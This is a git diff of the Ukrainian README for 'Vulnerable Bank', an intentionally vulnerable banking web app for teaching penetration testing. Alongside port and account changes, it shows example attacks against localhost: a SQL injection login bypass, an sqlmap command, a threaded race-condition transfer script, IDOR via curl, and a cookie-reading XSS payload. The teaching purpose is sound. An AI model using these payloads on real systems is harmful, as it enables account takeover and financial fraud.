@@ -4,6 +4,10 @@
 
 **Vulnerable Bank** - це навчальна банківська веб-аплікація з множинними вразливостями безпеки, розроблена для практичного навчання студентів спеціальності "Кібербезпека" навичкам пентестингу та аналізу безпеки фінансових систем.
 
+### 📚 Практична робота для студентів
+Детальна практична робота з покроковими інструкціями доступна в репозиторії:
+**[Banking Information Systems - Practical Work](https://github.com/PirogovAleksey/banking-information-systems)**
+
 ### Курс
 **Інформаційні банківські технології** (3 курс, Кібербезпека)
 
@@ -52,7 +56,7 @@
 - Docker 20.10+
 - Docker Compose 2.0+
 - 2 GB вільної RAM
-- Порти 5000, 8080, 3306 (вільні)
+- Порт 8080 (вільний)
 
 ### Встановлення
 
@@ -68,18 +72,19 @@ docker-compose up -d
 docker-compose ps
 
 # Відкрити в браузері
-http://localhost:5000
+http://localhost:8080
 ```
 
 ### Тестові акаунти
 
 | Користувач | Пароль | Роль | Баланс |
 |------------|--------|------|--------|
-| `admin` | `admin123` | Адміністратор | $1,000,000 |
-| `john` | `password` | Користувач | $5,000 |
-| `alice` | `123456` | Користувач | $10,000 |
-| `bob` | `qwerty` | Користувач | $2,500 |
-| `teller1` | `teller123` | Касир | $0 |
+| `admin` | `admin123` | Адміністратор | ₴1,000,000 |
+| `john` | `password` | Користувач | ₴5,000 |
+| `jane` | `123456` | Користувач | ₴10,000 |
+| `bob` | `qwerty` | Користувач | ₴2,500 |
+| `charlie` | `password123` | Користувач | ₴500 |
+| `alice` | `letmein` | Касир (Teller) | ₴15,000 |
 
 ---
 
@@ -208,7 +213,7 @@ Username: admin' OR '1'='1' --
 Password: anything
 
 # SQLMap
-sqlmap -u "http://localhost:5000/login" \
+sqlmap -u "http://localhost:8080/login" \
   --data "username=admin&password=test" \
   --batch --dbs
 ```
@@ -220,17 +225,17 @@ import requests
 import threading
 
 def transfer(session, amount):
-    session.post('http://localhost:5000/transfer',
+    session.post('http://localhost:8080/transfer',
                 data={'to_account': '1000000003', 'amount': amount})
 
 # Login
 s = requests.Session()
-s.post('http://localhost:5000/login',
-       data={'username': 'bob', 'password': 'qwerty'})
+s.post('http://localhost:8080/login',
+       data={'username': 'charlie', 'password': 'password123'})
 
-# Запустити 100 паралельних трансферів по $100
+# Запустити 50 паралельних трансферів по ₴100
 threads = []
-for i in range(100):
+for i in range(50):
     t = threading.Thread(target=transfer, args=(s, 100))
     threads.append(t)
     t.start()
@@ -245,17 +250,17 @@ print("Attack completed! Check if balance went negative.")
 
 ```bash
 # Перегляд свого рахунку (ID=2, john)
-curl -b cookies.txt http://localhost:5000/account/2
+curl -b cookies.txt http://localhost:8080/account/2
 
-# Спроба переглянути чужий рахунок (ID=3, alice)
-curl -b cookies.txt http://localhost:5000/account/3
-# Якщо вразливий - покаже дані alice!
+# Спроба переглянути чужий рахунок (ID=3, jane)
+curl -b cookies.txt http://localhost:8080/account/3
+# Якщо вразливий - покаже дані jane!
 ```
 
 ### Приклад 4: XSS
 
 ```
-1. Відкрити: http://localhost:5000/search?q=<script>alert(document.cookie)</script>
+1. Відкрити: http://localhost:8080/search?q=<script>alert(document.cookie)</script>
 2. Якщо вразливий - побачите alert з cookies
 ```
 
@@ -291,7 +296,7 @@ curl -b cookies.txt http://localhost:5000/account/3
 [Короткий опис для керівництва - 1 абзац]
 
 ### 2. Scope
-- Target: http://localhost:5000
+- Target: http://localhost:8080
 - Testing Period: [dates]
 - Methodology: OWASP Testing Guide
 
@@ -446,8 +451,8 @@ docker-compose up -d
 docker network ls | grep vulnerable-bank
 
 # Додатково: firewall rules
-sudo ufw deny from any to any port 5000
-sudo ufw allow from 192.168.1.0/24 to any port 5000
+sudo ufw deny from any to any port 8080
+sudo ufw allow from 192.168.1.0/24 to any port 8080
 ```
 
 ---
